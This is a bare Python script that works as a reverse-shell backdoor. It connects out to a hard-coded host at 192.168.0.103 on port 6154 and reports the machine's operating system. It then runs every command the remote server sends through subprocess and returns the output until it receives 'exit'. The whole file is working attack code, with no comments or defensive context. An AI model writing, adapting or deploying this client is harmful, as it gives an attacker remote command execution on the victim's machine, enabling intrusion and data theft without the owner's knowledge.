import socket
import subprocess
import sys
import os

def get_platform():
    platforms = {
        'linux1' : 'Linux',
        'linux2' : 'Linux',
        'darwin' : 'OS X',
        'win32' : 'Windows'
    }
    if sys.platform not in platforms:
        return sys.platform
    
    return platforms[sys.platform]

SERVER_HOST = "192.168.0.103"
SERVER_PORT = 6154
BUFFER_SIZE = 5120

s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))

platform = get_platform()
s.send(platform.encode())
        
while True:
    command = s.recv(BUFFER_SIZE).decode()
    if command.lower() == "exit":
        break   
    output = subprocess.getoutput(command)
    s.send(output.encode())
s.close()
